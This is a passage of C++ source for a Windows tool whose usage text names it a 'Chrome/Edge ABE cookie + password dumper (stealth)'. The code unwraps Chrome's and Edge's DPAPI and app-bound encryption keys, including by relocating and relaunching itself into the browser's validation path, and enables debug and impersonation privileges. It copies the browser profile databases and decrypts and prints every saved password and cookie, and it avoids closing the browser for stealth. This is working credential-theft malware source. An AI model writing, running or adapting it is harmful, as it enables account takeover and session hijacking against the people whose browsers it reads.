        LOAD_SQLITE(busyTimeout, "sqlite3_busy_timeout");
#undef LOAD_SQLITE
        if (!ok) {
            FreeLibrary(module);
            module = nullptr;
        }
        return ok;
    }

    ~SqliteApi() {
        if (module) FreeLibrary(module);
    }
};

static std::string columnTextValue(SqliteApi& api, sqlite3_stmt* statement, int column) {
    if (api.columnType(statement, column) == 5) return {};
    const unsigned char* text = api.columnText(statement, column);
    int size = api.columnBytes(statement, column);
    if (!text || size <= 0) return {};
    return std::string(reinterpret_cast<const char*>(text), static_cast<size_t>(size));
}

static Bytes columnBlobValue(SqliteApi& api, sqlite3_stmt* statement, int column) {
    if (api.columnType(statement, column) == 5) return {};
    const void* data = api.columnBlob(statement, column);
    int size = api.columnBytes(statement, column);
    if (!data || size <= 0) return {};
    const uint8_t* bytes = static_cast<const uint8_t*>(data);
    return Bytes(bytes, bytes + size);
}

// ---------------------------------------------------------------------------
// Value decryption
// ---------------------------------------------------------------------------
struct DecryptedValue {
    bool ok = false;
    std::string value;
    std::string encoding = "none";
    std::string scheme;
    std::string error;
};

static DecryptedValue decryptValue(const Bytes& blob, const Bytes& legacyKey,
    const Bytes& appBoundKey, bool cookie,
    const std::string& hostKey) {
    DecryptedValue result;
    if (blob.empty()) {
        result.error = "empty encrypted value";
        return result;
    }

    Bytes plaintext;
    if (blob.size() >= 3 && std::memcmp(blob.data(), "v20", 3) == 0) {
        result.scheme = "v20";
        if (appBoundKey.size() < 16) {
            result.error = "v20 value but the app-bound key is unavailable";
            return result;
        }
        if (blob.size() < 3 + 12 + 16) {
            result.error = "truncated v20 value";
            return result;
        }
        if (!aesGcmDecrypt(appBoundKey, blob.data() + 3, 12, blob.data() + 15,
            blob.size() - 31, blob.data() + blob.size() - 16, 16, plaintext)) {
            result.error = "v20 AES-GCM authentication failed";
            return result;
        }
    }
    else if (blob.size() >= 3 &&
        (std::memcmp(blob.data(), "v10", 3) == 0 || std::memcmp(blob.data(), "v11", 3) == 0)) {
        result.scheme.assign(reinterpret_cast<const char*>(blob.data()), 3);
        if (legacyKey.size() < 16) {
            result.error = result.scheme + " value but the legacy DPAPI key is unavailable";
            return result;
        }
        if (blob.size() < 3 + 12 + 16) {
            result.error = "truncated " + result.scheme + " value";
            return result;
        }
        if (!aesGcmDecrypt(legacyKey, blob.data() + 3, 12, blob.data() + 15,
            blob.size() - 31, blob.data() + blob.size() - 16, 16, plaintext)) {
            result.error = result.scheme + " AES-GCM authentication failed";
            return result;
        }
    }
    else {
        if (dpapiUnprotect(blob, plaintext)) {
            result.scheme = "dpapi";
        }
        else {
            plaintext = blob;
            result.scheme = "raw";
        }
    }

    // Chrome 130+ prefixes decrypted cookie values with SHA-256(host_key)
    if (cookie && plaintext.size() >= 32) {
        uint8_t digest[32];
        if (sha256(reinterpret_cast<const uint8_t*>(hostKey.data()), hostKey.size(), digest) &&
            std::memcmp(plaintext.data(), digest, 32) == 0) {
            plaintext.erase(plaintext.begin(), plaintext.begin() + 32);
        }
    }

    result.ok = true;
    if (validUtf8(plaintext.data(), plaintext.size())) {
        result.value.assign(reinterpret_cast<const char*>(plaintext.data()), plaintext.size());
        result.encoding = "utf8";
    }
    else {
        result.value = b64Encode(plaintext.data(), plaintext.size());
        result.encoding = "base64";
    }
    return result;
}

// ---------------------------------------------------------------------------
// Database staging + extraction
// ---------------------------------------------------------------------------
static unsigned g_tempCounter = 0;

static bool stageDatabase(const fs::path& source, fs::path& staged, fs::path& temporaryDirectory) {
    std::error_code ec;
    temporaryDirectory = fs::temp_directory_path(ec) /
        ("ced-" + std::to_string(GetCurrentProcessId()) + "-" + std::to_string(++g_tempCounter));
    if (ec) return false;
    fs::create_directories(temporaryDirectory, ec);
    if (ec) return false;

    staged = temporaryDirectory / source.filename();
    if (!CopyFileW(source.c_str(), staged.c_str(), FALSE)) {
        fs::remove_all(temporaryDirectory, ec);
        return false;
    }

    const wchar_t* suffixes[] = { L"-wal", L"-shm", L"-journal" };
    for (const wchar_t* suffix : suffixes) {
        fs::path sidecar = source;
        sidecar += suffix;
        if (fs::exists(sidecar, ec)) {
            fs::path destination = staged;
            destination += suffix;
            CopyFileW(sidecar.c_str(), destination.c_str(), FALSE);
        }
    }
    return true;
}

struct ConsoleSink {
    int success = 0;
    void row(const char* kind, const char* browser, const std::string& profile,
        const std::string& host, const std::string& user,
        const std::string& secret, const std::string& encoding,
        const std::string& scheme, const std::string& path,
        long long expiresUtc, long long expiresUnix, int secure,
        int httponly, const std::string& error) {
        (void)encoding; (void)expiresUtc; (void)expiresUnix;
        if (!error.empty()) {
            std::cout << "[" << kind << "] " << browser << "/" << profile << " "
                << consoleText(host) << " " << consoleText(user)
                << " error=" << error << "\n";
            return;
        }
        if (std::strcmp(kind, "cookie") == 0) {
            std::cout << "[cookie] " << browser << "/" << profile << " "
                << consoleText(host) << " " << consoleText(user) << "="
                << consoleText(secret);
            if (!scheme.empty()) std::cout << " scheme=" << scheme;
            if (!path.empty()) std::cout << " path=" << consoleText(path);
            if (secure) std::cout << " secure";
            if (httponly) std::cout << " httponly";
            std::cout << "\n";
        }
        else {
            std::cout << "[password] " << browser << "/" << profile << " "
                << consoleText(host) << " " << consoleText(user) << "="
                << consoleText(secret) << "\n";
        }
        ++success;
    }
};

static void dumpCookies(SqliteApi& api, sqlite3* database, const char* browser,
    const std::string& profile, const Bytes& legacyKey,
    const Bytes& appBoundKey, ConsoleSink& sink) {
    const char* sql =
        "SELECT host_key,name,value,encrypted_value,path,expires_utc,"
        "is_secure,is_httponly FROM cookies";
    sqlite3_stmt* statement = nullptr;
    if (api.prepare(database, sql, -1, &statement, nullptr) != 0) return;

    while (api.step(statement) == 100) {
        std::string host = columnTextValue(api, statement, 0);
        std::string name = columnTextValue(api, statement, 1);
        std::string plainValue = columnTextValue(api, statement, 2);
        Bytes encrypted = columnBlobValue(api, statement, 3);
        std::string path = columnTextValue(api, statement, 4);
        long long expiresUtc = api.columnInt64(statement, 5);
        int secure = api.columnInt(statement, 6);
        int httponly = api.columnInt(statement, 7);
        long long expiresUnix = expiresUtc > 0 ? (expiresUtc / 1000000LL - 11644473600LL) : 0;

        if (encrypted.empty()) {
            if (plainValue.empty()) {
                sink.row("cookie", browser, profile, host, name, "", "none", "",
                    path, expiresUtc, expiresUnix, secure, httponly, "empty cookie value");
                continue;
            }
            sink.row("cookie", browser, profile, host, name, plainValue, "utf8",
                "plain", path, expiresUtc, expiresUnix, secure, httponly, "");
            continue;
        }

        DecryptedValue value = decryptValue(encrypted, legacyKey, appBoundKey, true, host);
        if (value.ok) {
            sink.row("cookie", browser, profile, host, name, value.value,
                value.encoding, value.scheme, path, expiresUtc, expiresUnix,
                secure, httponly, "");
        }
        else if (!plainValue.empty()) {
            sink.row("cookie", browser, profile, host, name, plainValue, "utf8",
                "plain", path, expiresUtc, expiresUnix, secure, httponly, "");
        }
        else {
            sink.row("cookie", browser, profile, host, name, "", "none",
                value.scheme, path, expiresUtc, expiresUnix, secure, httponly, value.error);
        }
    }
    api.finalize(statement);
}

static void dumpPasswords(SqliteApi& api, sqlite3* database, const char* browser,
    const std::string& profile, const Bytes& legacyKey,
    const Bytes& appBoundKey, ConsoleSink& sink) {
    const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
    sqlite3_stmt* statement = nullptr;
    if (api.prepare(database, sql, -1, &statement, nullptr) != 0) {
        std::cerr << "[!] " << browser << "/" << profile << " prepare logins FAILED\n";
        return;
    }

    int scanned = 0, ok = 0, empty = 0, fail = 0;

    while (api.step(statement) == 100) {
        ++scanned;
        std::string origin = columnTextValue(api, statement, 0);
        std::string username = columnTextValue(api, statement, 1);
        Bytes encrypted = columnBlobValue(api, statement, 2);

        if (encrypted.empty()) {
            ++empty;
            continue;
        }

        DecryptedValue value = decryptValue(encrypted, legacyKey, appBoundKey, false, "");
        if (value.ok) {
            sink.row("password", browser, profile, origin, username, value.value,
                value.encoding, value.scheme, "", 0, 0, 0, 0, "");
            ++ok;
        }
        else {
            ++fail;
            std::cerr << "[-] password FAIL: " << value.error
                << " | " << origin << " | user=" << username
                << " | blob_len=" << encrypted.size()
                << " | scheme=" << value.scheme << "\n";
        }
    }
    api.finalize(statement);

    std::cerr << "[*] " << browser << "/" << profile
        << " passwords → scanned=" << scanned
        << " ok=" << ok
        << " empty=" << empty
        << " fail=" << fail << "\n";
}

static void processDatabase(SqliteApi& api, const fs::path& source, bool cookies,
    const char* browser, const std::string& profile,
    const Bytes& legacyKey, const Bytes& appBoundKey,
    ConsoleSink& sink) {
    fs::path staged, temporary;
    if (!stageDatabase(source, staged, temporary)) {
        std::cerr << "[!] " << browser << "/" << profile
            << " cannot stage " << (cookies ? "Cookies" : "Login Data")
            << " (still locked?)\n";
        return;
    }

    sqlite3* database = nullptr;
    int rc = api.open16(reinterpret_cast<const void*>(staged.c_str()), &database);
    if (rc != 0 || !database) {
        std::cerr << "[!] " << browser << "/" << profile
            << " cannot open staged " << (cookies ? "Cookies" : "Login Data") << "\n";
        if (database) api.close(database);
        std::error_code ec;
        fs::remove_all(temporary, ec);
        return;
    }

    api.busyTimeout(database, 5000);
    if (cookies)
        dumpCookies(api, database, browser, profile, legacyKey, appBoundKey, sink);
    else
        dumpPasswords(api, database, browser, profile, legacyKey, appBoundKey, sink);
    api.close(database);

    std::error_code ec;
    fs::remove_all(temporary, ec);
}

// ---------------------------------------------------------------------------
// Key loading + target discovery
// ---------------------------------------------------------------------------
struct Keys {
    Bytes legacy;
    Bytes appBound;
    fs::path relocateTo;
    std::string note;
};

struct Options {
    std::wstring browser = L"all";
    std::string keyHex;
    bool system = false;
    bool useCom = true;
    bool cookies = true;
    bool passwords = true;
    bool autoRelocate = true;
    bool relocated = false;
    bool verbose = false;
};

static void loadKeys(const fs::path& userDataDirectory, bool edge,
    const Options& options, Keys& keys) {
    if (!options.keyHex.empty()) {
        if (!hexDecode(options.keyHex, keys.appBound)) {
            keys.note += "invalid --key; ";
            keys.appBound.clear();
        }
    }

    std::string state;
    if (!readText(userDataDirectory / "Local State", state)) {
        keys.note += "Local State not found; ";
        return;
    }

    std::string encoded;
    if (jsonString(state, "encrypted_key", encoded)) {
        Bytes blob;
        if (b64Decode(encoded, blob)) {
            if (blob.size() >= 5 && std::memcmp(blob.data(), "DPAPI", 5) == 0)
                blob.erase(blob.begin(), blob.begin() + 5);
            if (!dpapiUnprotect(blob, keys.legacy))
                keys.note += "legacy DPAPI key failed; ";
        }
    }

    if (jsonString(state, "app_bound_encrypted_key", encoded)) {
        Bytes wrapped;
        if (b64Decode(encoded, wrapped)) {
            if (wrapped.size() >= 4 && std::memcmp(wrapped.data(), "APPB", 4) == 0)
                wrapped.erase(wrapped.begin(), wrapped.begin() + 4);

            if (keys.appBound.empty() && options.useCom) {
                std::string error;
                if (decryptWithElevator(wrapped, edge, keys.appBound, error))
                    keys.note += "app-bound key via IElevator; ";
                else
                    keys.note += error + "; ";
            }

            if (keys.appBound.empty() && (options.system || options.autoRelocate)) {
                Bytes inner;
                std::string unwrapError;
                if (systemDpapiUnwrap(wrapped, inner, unwrapError)) {
                    std::string deriveError;
                    if (deriveAppBoundKey(inner, keys.appBound, deriveError))
                        keys.note += "app-bound key via SYSTEM/user DPAPI; ";
                    else {
                        keys.note += deriveError + "; ";
                        std::wstring validationPath;
                        if (options.autoRelocate && extractValidationPath(inner, validationPath)) {
                            keys.relocateTo = validationPath;
                            keys.note += "relaunch from validation path required; ";
                        }
                    }
                }
                else {
                    keys.note += unwrapError + "; ";
                }
            }

            if (keys.appBound.empty() && keys.relocateTo.empty())
                keys.note += "v20 key unavailable; ";
        }
    }
}

struct Target {
    bool edge = false;
    const char* name = "";
    fs::path userData;
};

static std::vector<Target> discoverTargets(const Options& options) {
    std::vector<Target> targets;
    fs::path local = localAppDataPath();
    if (local.empty()) return targets;

    auto wanted = [&](const wchar_t* name) {
        if (options.browser == L"all") return true;
        return _wcsicmp(options.browser.c_str(), name) == 0;
    };

    if (wanted(L"chrome")) {
        Target target;
        target.edge = false;
        target.name = "Chrome";
        target.userData = local / L"Google" / L"Chrome" / L"User Data";
        std::error_code ec;
        if (fs::is_directory(target.userData, ec)) targets.push_back(target);
    }
    if (wanted(L"edge")) {
        Target target;
        target.edge = true;
        target.name = "Edge";
        target.userData = local / L"Microsoft" / L"Edge" / L"User Data";
        std::error_code ec;
        if (fs::is_directory(target.userData, ec)) targets.push_back(target);
    }
    return targets;
}

static std::vector<fs::path> profileDirectories(const fs::path& userData) {
    std::vector<fs::path> profiles;
    std::error_code ec;
    for (const auto& entry : fs::directory_iterator(userData, ec)) {
        if (ec) break;
        if (!entry.is_directory(ec) || ec) continue;
        fs::path path = entry.path();
        bool cookies = fs::is_regular_file(path / L"Network" / L"Cookies", ec) ||
            fs::is_regular_file(path / L"Cookies", ec);
        ec.clear();
        bool passwords = fs::is_regular_file(path / L"Login Data", ec) ||
            fs::is_regular_file(path / L"Login Data For Account", ec);
        ec.clear();
        if (cookies || passwords) profiles.push_back(path);
    }
    std::sort(profiles.begin(), profiles.end(),
        [](const fs::path& a, const fs::path& b) {
            bool aDefault = a.filename() == L"Default";
            bool bDefault = b.filename() == L"Default";
            if (aDefault != bDefault) return aDefault;
            return a.filename().wstring() < b.filename().wstring();
        });
    return profiles;
}

static std::string fileNameUtf8(const fs::path& path) {
    std::wstring name = path.filename().wstring();
    if (name.empty()) return {};
    int length = WideCharToMultiByte(CP_UTF8, 0, name.c_str(), static_cast<int>(name.size()),
        nullptr, 0, nullptr, nullptr);
    if (length <= 0) return {};
    std::string result(static_cast<size_t>(length), '\0');
    WideCharToMultiByte(CP_UTF8, 0, name.c_str(), static_cast<int>(name.size()),
        result.data(), length, nullptr, nullptr);
    return result;
}

// ---------------------------------------------------------------------------
// Relocate helper
// ---------------------------------------------------------------------------
static fs::path validationTargetDirectory(const std::wstring& validationPath) {
    fs::path directory(validationPath);
    if (_wcsicmp(directory.filename().c_str(), L"Application") != 0)
        directory /= L"Application";
    return directory;
}

static bool sameDirectory(const fs::path& left, const fs::path& right) {
    std::error_code ec;
    bool leftExists = fs::exists(left, ec);
    ec.clear();
    bool rightExists = fs::exists(right, ec);
    if (leftExists && rightExists) {
        ec.clear();
        return fs::equivalent(left, right, ec) && !ec;
    }
    return _wcsicmp(left.wstring().c_str(), right.wstring().c_str()) == 0;
}

static bool relaunchFromValidationPath(const std::wstring& validationPath,
    int argc, wchar_t** argv,
    int& exitCode, std::string& error) {
    std::wstring executable = currentExecutablePath();
    if (executable.empty()) {
        error = "cannot determine current executable path";
        return false;
    }

    fs::path targetDirectory = validationTargetDirectory(validationPath);
    fs::path targetExecutable = targetDirectory / fs::path(executable).filename();

    std::error_code ec;
    fs::create_directories(targetDirectory, ec);
    if (ec) {
        error = "cannot create validation directory (run as administrator)";
        return false;
    }

    if (!CopyFileW(executable.c_str(), targetExecutable.c_str(), FALSE)) {
        error = "cannot copy executable into validation directory (run as administrator)";
        return false;
    }

    std::wstring commandLine = quoteArgument(targetExecutable.wstring());
    for (int i = 1; i < argc; ++i) {
        commandLine += L' ';
        commandLine += quoteArgument(argv[i]);
    }
    commandLine += L" --relocated";

    STARTUPINFOW startup{};
    startup.cb = sizeof(startup);
    PROCESS_INFORMATION process{};
    std::vector<wchar_t> mutableCommandLine(commandLine.begin(), commandLine.end());
    mutableCommandLine.push_back(L'\0');

    BOOL created = CreateProcessW(targetExecutable.c_str(), mutableCommandLine.data(),
        nullptr, nullptr, FALSE, 0, nullptr, targetDirectory.c_str(),
        &startup, &process);
    if (!created) {
        DWORD lastError = GetLastError();
        DeleteFileW(targetExecutable.c_str());
        error = "CreateProcessW failed (" + std::to_string(lastError) +
            "); run the tool as administrator";
        return false;
    }

    WaitForSingleObject(process.hProcess, INFINITE);
    DWORD childExitCode = 1;
    GetExitCodeProcess(process.hProcess, &childExitCode);
    CloseHandle(process.hThread);
    CloseHandle(process.hProcess);
    DeleteFileW(targetExecutable.c_str());

    exitCode = static_cast<int>(childExitCode);
    return true;
}

// ---------------------------------------------------------------------------
// Entry
// ---------------------------------------------------------------------------
static bool g_suppressPause = false;

static void pauseForEnter() {
    std::cout << "\ndone. press Enter...";
    std::cin.get();
}

static void printUsage() {
    std::cerr
        << "abe_dump - Chrome/Edge ABE cookie + password dumper (stealth)\n"
        << "Usage: abe_dump [--browser chrome|edge|all]\n"
        << "                [--key <64 hex chars>] [--system] [--no-com]\n"
        << "                [--cookies-only] [--passwords-only]\n"
        << "                [--no-relocate] [--verbose]\n";
}

static bool parseOptions(int argc, wchar_t** argv, Options& options) {
    for (int i = 1; i < argc; ++i) {
        std::wstring argument = argv[i];
        auto next = [&](const wchar_t* name) -> std::wstring {
            if (i + 1 >= argc) {
                std::cerr << "missing value for ";
                std::wcerr << name << "\n";
                return {};
            }
            return argv[++i];
        };

        if (argument == L"--browser") {
            options.browser = next(L"--browser");
            if (options.browser != L"chrome" && options.browser != L"edge" &&
                options.browser != L"all") {
                std::cerr << "--browser must be chrome, edge, or all\n";
                return false;
            }
        }
        else if (argument == L"--key") {
            std::wstring value = next(L"--key");
            options.keyHex.assign(value.begin(), value.end());
        }
        else if (argument == L"--system") {
            options.system = true;
        }
        else if (argument == L"--no-com") {
            options.useCom = false;
        }
        else if (argument == L"--cookies-only") {
            options.passwords = false;
        }
        else if (argument == L"--passwords-only") {
            options.cookies = false;
        }
        else if (argument == L"--no-relocate") {
            options.autoRelocate = false;
        }
        else if (argument == L"--relocated") {
            options.relocated = true;
        }
        else if (argument == L"--verbose") {
            options.verbose = true;
        }
        else if (argument == L"--help" || argument == L"-h") {
            printUsage();
            return false;
        }
        else {
            std::wcerr << L"unknown argument: " << argument << L"\n";
            return false;
        }
    }
    return true;
}

static int run(int argc, wchar_t** argv) {
    Options options;
    if (!parseOptions(argc, argv, options)) {
        printUsage();
        return 2;
    }

    enablePrivilege(L"SeDebugPrivilege");
    enablePrivilege(L"SeImpersonatePrivilege");

    std::vector<Target> targets = discoverTargets(options);
    if (targets.empty()) {
        std::cerr << "no Chrome or Edge User Data directory found\n";
        return 1;
    }

    // Stealth: no killBrowser

    SqliteApi sqlite;
    if (!sqlite.load()) {
        std::cerr << "could not load winsqlite3.dll\n";
        return 1;
    }

    ConsoleSink sink;

    for (const Target& target : targets) {
        Keys keys;
        loadKeys(target.userData, target.edge, options, keys);

        if (!keys.note.empty() &&
            (options.verbose || (keys.appBound.empty() && keys.relocateTo.empty()))) {
            std::cerr << target.name << ": " << keys.note << "\n";
        }

        if (!keys.appBound.empty()) {
            std::cout << "ABE_KEY=";
            for (uint8_t b : keys.appBound) printf("%02x", b);
            std::cout << "\n";
            if (options.verbose)
                std::cerr << "[*] " << target.name << " key length = " << keys.appBound.size() << " bytes\n";
            if (keys.appBound.size() != 32)
                std::cerr << "[!] WARNING: expected 32-byte key, got " << keys.appBound.size() << "\n";
        }

        if (!keys.relocateTo.empty() && !options.relocated) {
            std::wstring executable = currentExecutablePath();
            fs::path currentDirectory = fs::path(executable).parent_path();
            fs::path targetDirectory = validationTargetDirectory(keys.relocateTo);
            if (!sameDirectory(currentDirectory, targetDirectory)) {
                if (!isProcessElevated())
                    std::cerr << "[!] need Administrator to relocate for " << target.name << "\n";
                std::string error;
                int exitCode = 1;
                if (relaunchFromValidationPath(keys.relocateTo, argc, argv, exitCode, error)) {
                    g_suppressPause = true;
                    return exitCode;
                }
                std::cerr << target.name << ": " << error << "\n";
            }
        }

        for (const fs::path& profile : profileDirectories(target.userData)) {
            std::string profileName = fileNameUtf8(profile);

            if (options.cookies) {
                fs::path cookies = profile / L"Network" / L"Cookies";
                std::error_code ec;
                if (!fs::is_regular_file(cookies, ec)) {
                    cookies = profile / L"Cookies";
                    ec.clear();
                }
                if (fs::is_regular_file(cookies, ec)) {
                    processDatabase(sqlite, cookies, true, target.name, profileName,
                        keys.legacy, keys.appBound, sink);
                }
            }

            if (options.passwords) {
                fs::path login = profile / L"Login Data";
                std::error_code ec;
                if (fs::is_regular_file(login, ec)) {
                    processDatabase(sqlite, login, false, target.name, profileName,
                        keys.legacy, keys.appBound, sink);
                }
                ec.clear();
                fs::path accountLogin = profile / L"Login Data For Account";
                if (fs::is_regular_file(accountLogin, ec)) {
                    processDatabase(sqlite, accountLogin, false, target.name,
                        profileName, keys.legacy, keys.appBound, sink);
                }
            }
        }
    }

    if (sink.success > 0)
        std::cerr << "\n[+] decrypted " << sink.success << " item(s)\n";
    else
        std::cerr << "\n[-] 0 items decrypted. Run with --verbose for details.\n";

    return 0;
}

int wmain(int argc, wchar_t** argv) {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    int exitCode = run(argc, argv);
    if (exitCode != 2 && !g_suppressPause) pauseForEnter();
    return exitCode;
}